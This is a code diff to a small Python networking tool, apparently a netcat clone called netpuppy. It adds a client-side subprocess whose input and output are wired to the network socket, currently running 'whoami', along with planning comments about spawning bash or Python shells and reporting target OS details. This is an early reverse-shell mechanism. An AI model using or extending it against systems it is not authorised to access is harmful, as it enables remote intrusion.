@@ -3,6 +3,7 @@ import argparse
 import socket
 import sys
 from netpuppy.classes import SocketConnection
+import subprocess
 
 
 def network_port(value: str) -> int:
@@ -59,7 +60,6 @@ def main() -> None:
         SERVER_IP = "0.0.0.0"
         SERVER_PORT = args.port
 
-
         # Create a socket:
         ls: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ls.bind((SERVER_IP, SERVER_PORT))
@@ -68,12 +68,12 @@ def main() -> None:
         # Set connection:
         print("Trying connection...")
         connection, addr = ls.accept()
+        sub_proc = "No"
 
     # Client mode
     elif args.cmd == "connect":
         HOST_IP = args.host_ip
         HOST_PORT = args.port
-
 
         # Create a socket:
         cs: socket.socket | None = None
@@ -98,12 +98,42 @@ def main() -> None:
         # Set connection:
         print("Trying connection...")
         connection = cs
+
+        # Start subprocess:
+        sub_proc = None
+
         connection.connect((HOST_IP, HOST_PORT))
 
     if connection:
         # Get peer name and port, create SocketConnection object:
         peer = connection.getpeername()  # [peername, peer port]
         current_connection: SocketConnection = SocketConnection(connection, peer[0])
+
+        # if there s a subprocess, execute that shit
+        # subprocess.execute()
+        if sub_proc is None:
+            # make a subprocess to use for extracting target info
+            try:
+                socket_file_np = current_connection.socket.fileno()
+
+                sub_proc = subprocess.Popen(
+                    ["whoami"],
+                    stdin=socket_file_np,
+                    stderr=socket_file_np,
+                    stdout=socket_file_np,
+                )
+
+                # socket_file_np = connection.fileno
+
+                # output = sub_proc.PIPE
+            #                print(f"result = {output}")
+            except Exception as err:
+                print(f"Exception in subproc try block: {err}")
+        #
+        #
+        ##
+        #
+        #
 
         # Update user:
         print(f"Connection established to: {current_connection.address} port {peer[1]}")
@@ -129,3 +159,50 @@ def main() -> None:
     else:
         print("Connection failed.")
         sys.exit(1)
+
+
+# SUDO CODE: (what OS)
+# nmap fingerprint
+# WHAT DOES TP WANT!??!!??
+#       - prompt > (local user): current directory
+#       - message on connection which tells the user:
+#           - what os
+#           - what directory?
+#  SHELL OPTIONS:
+#           Linux: files (if the target is linux)
+#               'open' a /bin/bash process file
+#                   return stdout back
+#                       pipe our input into stdin
+#          Python: check for python on the system
+#               make a python shell
+#
+#
+
+# BASH's JOB?
+#   - find bash
+#   - call him up
+#   - subprocess lib?
+
+
+# PYTHON'S JOB?
+#
+
+
+#        SERVERS JOB?
+# start a shell/ subprocess thing to gather info about the target based on the
+# input from the client
+#
+
+#
+# 100,000 feet:
+#   connect to the other computer target
+#   report back some env info like the os,
+#
+#   50, 000 feet
+#   either:"
+#         a command which will work regardless of the OS (python)
+#           if else:
+#               if its not linux
+#                    its something shitty
+#
+# STRUCTURE:
